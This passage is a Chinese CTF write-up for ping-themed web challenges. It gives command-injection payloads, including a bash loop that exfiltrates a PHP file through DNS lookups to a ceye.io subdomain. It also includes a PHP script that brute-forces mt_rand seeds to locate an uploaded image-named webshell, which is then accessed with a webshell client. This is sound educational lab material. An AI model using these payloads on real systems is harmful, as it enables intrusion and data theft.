得到`flag{sdfsdfvdfbdgsd}`
#### 另一种操作
进入后查看`robots.txt`，获得源码，以及`where_is_flag.php`
    ","0.0",$ip);
    system("ping  ".$ip);
    ?>
知需要使用`ping`读取文件`where_is_flag.php`，这里使用一个开源项目搭建的平台`CEYE`，原理是访问一个域名的下属子域名时，
`dns`解析会有记录。在`linux`中可以使用飘号包裹命令，如：`ping 'echo
111'.xxx.com`（'代表飘号，Markdown中写不出来）。
或可以使用`ping http://xxxxx/'whoami`'，解析主机的访问记录
但是这里由于换行符的干扰无法直接读取文件，故使用bash的循环：
    ping=127.0.0.1 -c 1;for i in `cat where_is_flag.php`;do ping $i.3awcx4.ceye.io;done;
得到`$flag="dgfsdunsadkjgdgdfhdfhfgdhsadf/flag.php"`，同样的方法读取，
得到`flag{sdfsdfvdfbdgsd}`
### 四：ping也能把你ping挂
这题看到后再看前面题目名也是ping，感觉应该是类似的操作，所以估计这题也是命令执行了。
进入网页后看到一个输入框，输入ip地址，然后输入框下面会回显ping的结果。
尝试在ip地址后加上一些字符，来执行下一个命令。比如：
    1.1.1.1|ls
    1.1.1.1 > ls
    1.1.1.1; ls
    1.1.1.1&ls
反正就是一顿乱揍，到最后的&终于成功回显了：
通过观察ls的回显，发现了一个`upload`文件夹和一个文件上传的php文件。进入`you_find_upload.ph`p页面，就是一个常规的文件上传页面。
上传之后也没啥回显，也不知道文件名。发现上面的导航栏多了个查看源码，点进去。
就会得到`you_find_upload.php`源码，源码如下(无关紧要的html代码我就不贴了，太长了)：
    Select image to upload:
    upload
    \n";
    } else {
    echo "File is not an image";
    }
    }
    if(isset($_GET['p'])){
    if(@preg_match("/\.\.\//",$_GET['p'])){
    echo "ä½ è¿ä¸ªå­©å­ï¼too young too simple";
    }
    else{
       @include $_GET['p'].".php";
    }
    }
    ?>
分析之后发现对于上传的文件有个限制,就是文件名必须以.jpg或.png或.gif结尾。上传之后，将文件命名成”随机数字+_+原文件名”。
这里发现，就算上传了图片马，你没有随机数啊！所以还是找不到文件的。
仔细看代码，发现三个关键点：
    1.mt_srand((time() % rand(1,100000)%rand(1000,9000)));
    这是生成一个随机种子
    2.echo mt_rand()
    做一次随机运算
    3. $filename = '/var/www/html/web1/upload/'.mt_rand().'_'.$_FILES['file']['name']; 
    再做一此随机运算，并将这个随机数作为文件名的一部分。
由此可见，如果第三步的随机数能搞到，那文件名就出来了。可是这个随机数怎么搞？只好求助一下百度，
发现mt_rand()生成的是伪随机数，也就是说，只要种子固定，那么每次的的mt_rand()都是固定的。举个例子：
    ";
    echo mt_rand();//再次输出随机数
    echo "";
    echo mt_rand();//再再次输出随机数
    ?>
输出结果：
    1244335972
    15217923
    1546885062
再刷新试试，就会发现，不管刷新多少次，生成的随机数都是固定的。因此生成的随机数只跟两个值有关，一个是种子的值，一个是计算的次数。
而种子在源代码中有，计算的次数我们也已经知道了(2次，因为第二个mt_rand()用于合成文件名)。所以，基本上文件名就出来了。看一下种子：
    mt_srand((time() % rand(1,100000)%rand(1000,9000)));
这个种子是跟时间相关的，可是你echo一下种子你就会发现，种子的值在0~10000之间(并不精确，仅仅是我根据echo大致猜测的)。
整理一下思路，我上面说，随机数只跟两个因素有关，一个是种子，一个是计算的次数。现在已经知道了，种子的值是0~10000，计算的次数是2。
所以我们最多只要计算1w次就能找到这个随机数了。方法就是写个php脚本，进行爆破。这里有个小技巧，你可以将同一个文件上传多次，
这样爆破的时间会减少很多。上脚本(渣渣一个，脚本写的太渣了QAQ)：
    ";
    mt_srand($index);
    mt_rand();
    $random_pre = mt_rand();
    $filename = $random_pre.'_1.php.jpg';
    $cur_url = $url.$filename;
    if(curl_get($cur_url)){
    $result = $result.$filename.'--';
    exit;
    }
    $index++;
    }
    if($index == 1001){
    echo "no result!";
    }
    function curl_get($tmp_url){
    $ch=curl_init();
    curl_setopt($ch,CURLOPT_URL,$tmp_url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch,CURLOPT_HEADER,1);
    $result=curl_exec($ch);
    $code=curl_getinfo($ch,CURLINFO_HTTP_CODE);
    if($code=='404' && $result){
    curl_close($ch);
    return 0;
    } else {
    curl_close($ch);
    echo $code;
    echo "";
    echo "#####got one!===>>>".$tmp_url;
    echo "";
    return 1;
    }
    }
这样基本就能爆破出我们的文件了，爆出来之后面临的问题就是解析了。众所周知，`apache`的解析漏洞只能使用apache不认识的后缀名，
而这题已经限制死了，必须以图片格式结尾。所以常规办法已经无法继续了(也许因为我菜？)，后来尝试`1.php.jpg`时，没想到竟然成功解析了！
解析成功后用菜刀连一下，发现flag在根目录下(第一次做上传的我，光找这个flag就找了十多分钟QAA)。
参考文章：
DNSlog攻击技巧：
解析如何在C语言中调用shell命令的实现方法: